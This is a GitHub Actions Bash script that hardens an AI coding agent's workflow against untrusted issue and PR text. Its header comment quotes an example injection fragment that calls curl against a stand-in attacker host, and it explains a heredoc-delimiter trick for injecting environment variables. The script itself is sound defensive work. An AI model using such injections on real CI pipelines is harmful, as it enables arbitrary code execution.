#!/bin/bash
# prepare-event-context.sh — untrusted input (issue_comment 本文・PR タイトル/本文・
# workflow_dispatch プロンプト) を「ファイル」に隔離し、後続 step が使うスカラー値だけを
# $GITHUB_ENV に 1 行ずつ書く。
#
# なぜこのスクリプトがあるか (旧実装からの修正点):
#   1. script injection: 旧 workflow は
#        printf '%s' "${{ github.event.comment.body }}" | head -c 20000
#      と run スクリプト中に直接展開していた。${{ }} は shell 実行前にランナーが文字列
#      置換するので、repo が public である以上「issue にコメントできる全員」が
#      `"; curl attacker/... ; echo "` のような断片を仕込んで任意コマンドを実行できた。
#      ここでは untrusted 値を一切 env 経由で受け取らない。jq が $GITHUB_EVENT_PATH を
#      直接読むので、shell には渡らない。
#   2. env 変数注入: 旧実装は
#        echo "COMMENT_BODY<<OCCTXEOF" ... echo "OCCTXEOF"
#      と $GITHUB_ENV に heredoc で本文を載せていた。本文中に OCCTXEOF だけの行が
#      あればデリミタが早期終了し、以降の行が環境変数代入として解釈されて
#      PATH を含む任意の env を後続 step に注入できた。本文は必ずファイルに書き出す。
#   3. UTF-8 分断: `head -c 20000` はバイト単位なのでマルチバイト境界を壊しうる。
#      jq の文字列スライス (codepoint 単位) に置き換えた。
#   4. コマンド判定: 旧 workflow の `contains(body, '/oc')` は部分一致なので
#      `.../ocean/...` や URL 内の `/oc/` でも発火する。行頭アンカーの正規表現に
#      置き換えた。job の if: は粗い前フィルタに留まり、確定判定はここが正本。
set -euo pipefail

: "${GITHUB_EVENT_PATH:?GITHUB_EVENT_PATH is not set}"
: "${RUNNER_TEMP:?RUNNER_TEMP is not set}"
: "${GITHUB_ENV:?GITHUB_ENV is not set}"
: "${GITHUB_EVENT_NAME:?GITHUB_EVENT_NAME is not set}"

EVENT_NAME="$GITHUB_EVENT_NAME"
COMMENT_FILE="$RUNNER_TEMP/opencode-comment.txt"
PR_TITLE_FILE="$RUNNER_TEMP/opencode-pr-title.txt"
PR_BODY_FILE="$RUNNER_TEMP/opencode-pr-body.txt"
MAX_CHARS="${OC_COMMENT_MAX_CHARS:-20000}"
PM_TARGET_FILE="$RUNNER_TEMP/opencode-pm-target.txt"

log() { printf '%s\n' "$*"; }

# ---------------------------------------------------------------- oc-pm (PM agent。#2327)
# repository_dispatch (action oc-pm) は payload の kind (列挙 9 値) と ref (数字) だけを読む。
# 他のフィールドは読まず、指示文にも env にも入れない。対象 (issue/PR) の本文・ラベル・review・
# コメントは API で取り、$PM_TARGET_FILE に隔離する (指示文は assemble-prompt.sh が fence で囲む)。
# 成功時だけ pm_kind / pm_ref を設定する。失敗は return 1 (呼び出し側が dispatch_ok=false にする)。
oc_pm_prepare() {
  local keys kind ref ref_n n reviews comments issue_json author_login author_type author_assoc author_ok
  keys="$(jq -c '.client_payload | keys' "$GITHUB_EVENT_PATH" 2>/dev/null || true)"
  if [ "$keys" != '["kind","ref"]' ]; then
    printf '::error::oc-pm: client_payload must have exactly kind and ref\n'
    return 1
  fi
  kind="$(jq -r '(.client_payload.kind // "") | tostring' "$GITHUB_EVENT_PATH")"
  ref="$(jq -r '(.client_payload.ref // "") | tostring' "$GITHUB_EVENT_PATH")"
  case "$kind" in
    stuck | no_pr | refs_orphan | needs_decision | stopped_report | user_answered | supply | digest | retro) ;;
    *)
      printf '::error::oc-pm: client_payload.kind is not in the allowed list\n'
      return 1
      ;;
  esac
  if ! [[ "$ref" =~ ^[0-9]{1,7}$ ]]; then
    printf '::error::oc-pm: client_payload.ref must be 1 to 7 digits\n'
    return 1
  fi
  ref_n=$((10#$ref))
  case "$kind" in
    supply | digest | retro)
      # 対象を持たない kind。ref は 0 でもよい。
      : > "$PM_TARGET_FILE"
      chmod 600 "$PM_TARGET_FILE"
      pm_kind="$kind"
      pm_ref="$ref_n"
      return 0
      ;;
  esac
  if [ "$ref_n" -eq 0 ]; then
    printf '::error::oc-pm: ref 0 is only allowed for supply, digest, retro\n'
    return 1
  fi
  if [ -z "${GH_TOKEN:-}" ]; then
    printf '::error::oc-pm: GH_TOKEN is needed to read the target\n'
    return 1
  fi
  issue_json="$(gh api "repos/${GITHUB_REPOSITORY:-}/issues/$ref_n" 2>/dev/null)" || {
    printf '::error::oc-pm: could not read the target #%s\n' "$ref_n"
    return 1
  }
  # 対象の起票者は、許可 bot (実装・reviewer の App) か、OWNER/MEMBER/COLLABORATOR だけ。
  author_login="$(printf '%s' "$issue_json" | jq -r '.user.login // ""')"
  author_type="$(printf '%s' "$issue_json" | jq -r '.user.type // ""')"
  author_assoc="$(printf '%s' "$issue_json" | jq -r '.author_association // ""')"
  author_ok=false
  case "$author_assoc" in OWNER | MEMBER | COLLABORATOR) author_ok=true ;; esac
  if [ "$author_type" = Bot ]; then
    case "$author_login" in
      'opencode-for-signature-studio[bot]' | 'oc-reviewer-for-signature-studio[bot]') author_ok=true ;;
    esac
  fi
  if [ "$author_ok" != true ]; then
    printf '::notice::oc-pm: the target author is not allowed (association=%s, type=%s)\n' "${author_assoc:-none}" "${author_type:-none}"
    return 1
  fi
  reviews=""
  case "$kind" in
    stuck | needs_decision)
      reviews="$(gh api --paginate "repos/${GITHUB_REPOSITORY:-}/pulls/$ref_n/reviews?per_page=100" 2>/dev/null | jq -s 'add // []')" || {
        printf '::error::oc-pm: could not read the reviews of #%s\n' "$ref_n"
        return 1
      }
      ;;
  esac
  comments="$(gh api --paginate "repos/${GITHUB_REPOSITORY:-}/issues/$ref_n/comments?per_page=100" 2>/dev/null | jq -s 'add // []')" || {
    printf '::error::oc-pm: could not read the comments of #%s\n' "$ref_n"
    return 1
  }
  n=5
  if [ "$kind" = no_pr ]; then n=1; fi
  {
    printf '### 本文\n'
    printf '%s' "$issue_json" | jq -r --argjson max "$MAX_CHARS" '(.body // "") | .[0:$max]'
    printf '\n\n### ラベル\n'
    printf '%s' "$issue_json" | jq -r '[.labels[]?.name] | join(" ")'
    if [ -n "$reviews" ]; then
      printf '\n\n### review (直近 5 件)\n'
      printf '%s' "$reviews" | jq -r '[.[] | (.body // "")] | .[length - 5:] | map(.[0:4000]) | join("\n\n---\n\n")'
    fi
    printf '\n\n### コメント (%s)\n' "$kind"
    printf '%s' "$comments" | jq -r --arg kind "$kind" --argjson n "$n" '
      [ .[] | select(
          if $kind == "stuck" then (.user.type == "Bot" and ((.body // "") | contains("<!-- oc-fix-limit -->")))
          elif $kind == "no_pr" then (.user.type == "Bot" and ((.body // "") | contains("<!-- oc-run-outcome:")))
          elif $kind == "user_answered" then true
          else (.user.type == "Bot") end) ]
      | .[length - $n:]
      | map("### comment (" + (.user.login // "") + ")\n" + ((.body // "") | .[0:4000]))
      | join("\n\n")'
  } > "$PM_TARGET_FILE"
  chmod 600 "$PM_TARGET_FILE"
  pm_kind="$kind"
  pm_ref="$ref_n"
  return 0
}

# ---------------------------------------------------------------- untrusted 本文
# 本文は env 経由でしか受け取らない。${{ }} 展開は actionlint が untrusted として
# 検出するうえ、repo が public なので issue には誰でもコメントできる。
# repository_dispatch (type oc-fix: watchdog が競合 PR を fix run に載せる。#731) は、payload から
# PR 番号 (数字のみ)・理由 (列挙値)・素材名 (allowlist) だけを受け取る。自由な文字列は受け取らず、
# 指示文はこのスクリプトが理由から組み立てる。
dispatch_pr=""
dispatch_artifacts=""
dispatch_ok=true
pm_kind=""
pm_ref=""
dispatch_action=""
if [ "$EVENT_NAME" = repository_dispatch ]; then
  dispatch_action="$(jq -r '(.action // "") | tostring' "$GITHUB_EVENT_PATH")"
fi
if [ "$dispatch_action" = oc-pm ]; then
  comment_body=""
  oc_pm_prepare || dispatch_ok=false
elif [ "$EVENT_NAME" = repository_dispatch ] && [ "$dispatch_action" != oc-fix ]; then
  printf '::error::repository_dispatch: unknown action "%s"\n' "$(printf '%s' "$dispatch_action" | tr -cd 'a-z0-9-' | head -c 40)"
  dispatch_ok=false
  comment_body=""
elif [ "$EVENT_NAME" = repository_dispatch ]; then
  dispatch_pr="$(jq -r '(.client_payload.pr // "") | tostring' "$GITHUB_EVENT_PATH")"
  dispatch_reason="$(jq -r '(.client_payload.reason // "") | tostring' "$GITHUB_EVENT_PATH")"
  dispatch_artifacts="$(jq -r '(.client_payload.artifacts // "") | tostring | .[0:300]' "$GITHUB_EVENT_PATH")"
  if ! printf '%s' "$dispatch_pr" | grep -qE '^[0-9]{1,7}$'; then
    printf '::error::repository_dispatch: client_payload.pr must be digits only\n'
    dispatch_ok=false
  fi
  case "$dispatch_reason" in
    conflict)
      comment_body='この PR は main と競合しています。競合 PR は review イベントでワークフローが起動しないため、watchdog がこの依頼を送りました。origin/main を merge して競合を解消し、push してください (競合解消以外の変更はしない。main 側の変更を消さない)。競合した箇所と解消方針を PR にコメントで報告してください。'
      ;;
    changes-requested)
      comment_body='現在の head に対する oc-reviewer の差し戻し (CHANGES_REQUESTED) の指摘が、まだ修正されていません。その review と inline コメントを読み、指摘を修正して push してください (指摘への対応以外の変更はしない)。対応した内容と、対応しなかった指摘の理由を PR にコメントで報告してください。'
      ;;
    *)
      printf '::error::repository_dispatch: unknown reason "%s"\n' "$(printf '%s' "$dispatch_reason" | tr -cd 'a-z0-9-' | head -c 40)"
      dispatch_ok=false
      comment_body=""
      ;;
  esac
elif [ -n "${OC_COMMENT_BODY:-}" ]; then
  comment_body="$OC_COMMENT_BODY"
else
  comment_body="$(jq -r --argjson max "$MAX_CHARS" '
    (.review.body // .comment.body // .pull_request.body // .inputs.prompt // "")
    | .[0:$max]
  ' "$GITHUB_EVENT_PATH")"
fi

printf '%s' "$comment_body" > "$COMMENT_FILE"
chmod 600 "$COMMENT_FILE"

pr_title="$(jq -r '(.pull_request.title // "") | .[0:500]' "$GITHUB_EVENT_PATH")"
printf '%s' "$pr_title" > "$PR_TITLE_FILE"
chmod 600 "$PR_TITLE_FILE"

pr_body="$(jq -r --argjson max "$MAX_CHARS" '
  (.pull_request.body // "") | .[0:$max]
' "$GITHUB_EVENT_PATH")"
printf '%s' "$pr_body" > "$PR_BODY_FILE"
chmod 600 "$PR_BODY_FILE"

# review は push (pull_request の synchronize) で起動するが、agent は「push → 本文に oc_artifacts を追記」の
# 順に動くことがあり、payload の本文は起動時点の古い値になる。そのままだと素材が fl-win64 だけになって
# reviewer が e2e を再実行できない (#820)。トークンがあれば API で現在の本文を取り直す。
# 取れなければ payload の本文のまま進む (警告のみ)。
case "$MAX_CHARS" in '' | *[!0-9]*) MAX_CHARS=20000 ;; esac
case "$EVENT_NAME" in
  pull_request | pull_request_review)
    if [ -n "${GH_TOKEN:-}" ]; then
      pr_num_now="$(jq -r '.pull_request.number // empty' "$GITHUB_EVENT_PATH")"
      if [ -n "$pr_num_now" ] && fresh_body="$(gh api "repos/${GITHUB_REPOSITORY:-}/pulls/${pr_num_now}" --jq "(.body // \"\") | .[0:${MAX_CHARS}]" 2>/dev/null)"; then
        pr_body="$fresh_body"
        printf '%s' "$pr_body" > "$PR_BODY_FILE"
        log "refreshed the PR body from the API (${#pr_body} chars)"
      else
        log "::warning::could not refresh the PR body from the API; using the event payload"
      fi
    fi
    ;;
esac

# ---------------------------------------------------------------- コマンド判定
# 行頭 (空白は許容) に /oc または /opencode があり、その後に空白か行末がある行がある
# ときだけ起動する。`/ocean` や URL 内の `/oc/` では発火しない。
#
# 判定をこのスクリプトに置く理由: Actions の式には正規表現がないため、job レベルの
# `if:` は contains() による粗い前フィルタに留まらざるを得ない。確定した判定を
# should_run output に出すことで、以降の高コスト step (App トークン発行・checkout・
# agent-setup・opencode 実行) を丸ごとスキップでき、job は緑のままにできる。
COMMAND_RE='^[[:space:]]*/(oc|opencode)([[:space:]]|$)'
should_run=true
if [ "$EVENT_NAME" = issue_comment ] && ! grep -qE "$COMMAND_RE" "$COMMENT_FILE"; then
  log "::notice::no /oc or /opencode command on a line of its own; the agent will not run"
  should_run=false
fi
if [ "$dispatch_ok" != true ]; then
  should_run=false
fi

# ---------------------------------------------------------------- 投稿者の確認 (issue_comment)
# workflow の if: と同じ判定を二重に行う (こちらが確定判定。if: は費用対効果のための前フィルタ)。
#   - author_association が COLLABORATOR / MEMBER / OWNER の人
#   - PM 用 GitHub App (OC_PM_BOT_LOGIN と user.login が完全一致し、user.type が Bot)
# OC_PM_BOT_LOGIN が空・未設定なら bot は一切許可しない。App のログイン (`<slug>[bot]`) は GitHub が付与し、
# 第三者は同じログインのコメントを作れない。実装 App・reviewer App のログインが設定されても許可しない
# (agent 自身のコメントが /oc を含むと自己起動のループになるため。設定の誤りを fail-closed にする)。
if [ "$EVENT_NAME" = issue_comment ]; then
  c_assoc="$(jq -r '.comment.author_association // ""' "$GITHUB_EVENT_PATH")"
  c_type="$(jq -r '.comment.user.type // ""' "$GITHUB_EVENT_PATH")"
  c_login="$(jq -r '.comment.user.login // ""' "$GITHUB_EVENT_PATH")"
  pm_bot="${OC_PM_BOT_LOGIN:-}"
  commenter_ok=false
  case "$c_assoc" in COLLABORATOR | MEMBER | OWNER) commenter_ok=true ;; esac
  if [ "$commenter_ok" != true ] && [ -n "$pm_bot" ] && [ "$c_type" = Bot ] && [ "$c_login" = "$pm_bot" ] \
    && [ "$c_login" != "${OC_IMPLEMENTER_LOGIN:-opencode-for-signature-studio[bot]}" ] \
    && [ "$c_login" != "${OC_REVIEWER_LOGIN:-oc-reviewer-for-signature-studio[bot]}" ]; then
    commenter_ok=true
    log "commenter is the PM App ($c_login)"
  fi
  if [ "$commenter_ok" != true ]; then
    log "::notice::the commenter is not allowed to start the agent (association=${c_assoc:-none}, type=${c_type:-none})"
    should_run=false
  fi
fi
printf 'should_run=%s\n' "$should_run" >> "${GITHUB_OUTPUT:-/dev/null}"

# ---------------------------------------------------------------- 素材 (R2 artifacts)
# 本文に `oc_artifacts: fl-win64 plugins-ott` の行があれば、その素材を agent-setup が
# R2 から取得する。本文は untrusted なので allowlist に一致する語だけを通す。
# 指定が無ければ空 (workflow 側で既定の fl-win64 になる)。
# `none` を単独で書くと「追加素材なし」の明示として空扱いにする。他の名前との混在は拒否する。
# 注意: 全素材で約 17.7 GiB (2026-10-13 実測)。runner の空きに収まるよう必要なものだけ指定すること。
ARTIFACT_RE='^(fl-win64|plugins-(ott|freshair|serum2|massivex|kilohearts)|toolchain-(retdec|emsdk)|work-(m11|liftdiff|m6-ott|liftlib-targets|liftlib|icall|fw-stage1)|analysis-(ott-binaries|mac-shared)|apt-mingw)$'
artifacts=""
none_count=0
# pull_request_review (reviewer の差し戻し) の本文は reviewer の指摘であり、素材の指定は PR 本文にある。
ARTIFACTS_SRC="$COMMENT_FILE"
case "$EVENT_NAME" in pull_request | pull_request_review) ARTIFACTS_SRC="$PR_BODY_FILE" ;; esac
if [ "$EVENT_NAME" = repository_dispatch ]; then
  ARTIFACTS_SRC="$RUNNER_TEMP/opencode-dispatch-artifacts.txt"
  printf 'oc_artifacts: %s\n' "$dispatch_artifacts" > "$ARTIFACTS_SRC"
  chmod 600 "$ARTIFACTS_SRC"
fi
artifacts_line="$(grep -m1 -E '^[[:space:]]*oc_artifacts:' "$ARTIFACTS_SRC" || true)"
if [ -n "$artifacts_line" ]; then
  for name in $(printf '%s' "${artifacts_line#*oc_artifacts:}" | tr -cd 'a-z0-9 -'); do
    if [ "$name" = none ]; then
      none_count=$((none_count + 1))
      continue
    fi
    if ! printf '%s' "$name" | grep -qE "$ARTIFACT_RE"; then
      printf '::error::oc_artifacts: unknown artifact "%s" (allowed: none, fl-win64, plugins-{ott,freshair,serum2,massivex,kilohearts}, toolchain-{retdec,emsdk}, work-{m11,liftdiff,m6-ott,liftlib-targets,liftlib,icall,fw-stage1}, analysis-{ott-binaries,mac-shared}, apt-mingw)\n' "$name"
      exit 1
    fi
    artifacts="${artifacts:+$artifacts }$name"
  done
  if [ "$none_count" -gt 0 ]; then
    if [ "$none_count" -gt 1 ] || [ -n "$artifacts" ]; then
      printf '::error::oc_artifacts: "none" must be the only name (no other names, no repeats)\n'
      exit 1
    fi
  fi
fi
printf 'artifacts=%s\n' "$artifacts" >> "${GITHUB_OUTPUT:-/dev/null}"

# ---------------------------------------------------------------- 権限
# 権限の正本は workflow の job-level env 式 (OC_PERMISSION)。ここは値域を検証して
# そのまま後続 step に引き継ぐ。'read' / 'write' 以外の値は受け入れない。
# (式をそのまま再計算して二重に持つと、どちらが正本か分からなくなるため)
permission="${OC_PERMISSION:-}"
case "$permission" in
  read | write) ;;
  *)
    printf '::error::OC_PERMISSION must be "read" or "write", got "%s"\n' "$permission"
    exit 1
    ;;
esac

issue_number="$(jq -r '.issue.number // empty' "$GITHUB_EVENT_PATH")"
pr_number="$(jq -r '.issue.number // .pull_request.number // empty' "$GITHUB_EVENT_PATH")"
[ "$EVENT_NAME" = repository_dispatch ] && [ "$dispatch_ok" = true ] && pr_number="$dispatch_pr"
[ "$dispatch_action" = oc-pm ] && [ "$dispatch_ok" = true ] && pr_number="$pm_ref"

# ------------------------------------------------------- $GITHUB_ENV への書き込み
# ここから下は「1 行の値」しか書かない。複数行・heredoc・untrusted 本文は書かない。
dispatch_reason_env=""
if [ "$EVENT_NAME" = repository_dispatch ] && [ "$dispatch_ok" = true ]; then
  case "${dispatch_reason:-}" in
    conflict | changes-requested) dispatch_reason_env="$dispatch_reason" ;;
  esac
fi
{
  printf 'OC_EVENT_NAME=%s\n' "$EVENT_NAME"
  printf 'OC_DISPATCH_REASON=%s\n' "$dispatch_reason_env"
  printf 'OC_PERMISSION=%s\n' "$permission"
  printf 'OC_COMMENT_FILE=%s\n' "$COMMENT_FILE"
  printf 'OC_PR_TITLE_FILE=%s\n' "$PR_TITLE_FILE"
  printf 'OC_PR_BODY_FILE=%s\n' "$PR_BODY_FILE"
  printf 'OC_ISSUE_NUMBER=%s\n' "$issue_number"
  printf 'OC_PR_NUMBER=%s\n' "$pr_number"
  printf 'OC_REPO=%s\n' "${GITHUB_REPOSITORY:-}"
  printf 'OC_PM_KIND=%s\n' "$pm_kind"
  printf 'OC_PM_REF=%s\n' "$pm_ref"
  printf 'OC_PM_TARGET_FILE=%s\n' "$PM_TARGET_FILE"
} >> "$GITHUB_ENV"

log "event=$EVENT_NAME permission=$permission issue=${issue_number:-none} pr=${pr_number:-none}"
log "comment=$COMMENT_FILE (${#comment_body} chars, $(wc -c < "$COMMENT_FILE") bytes)"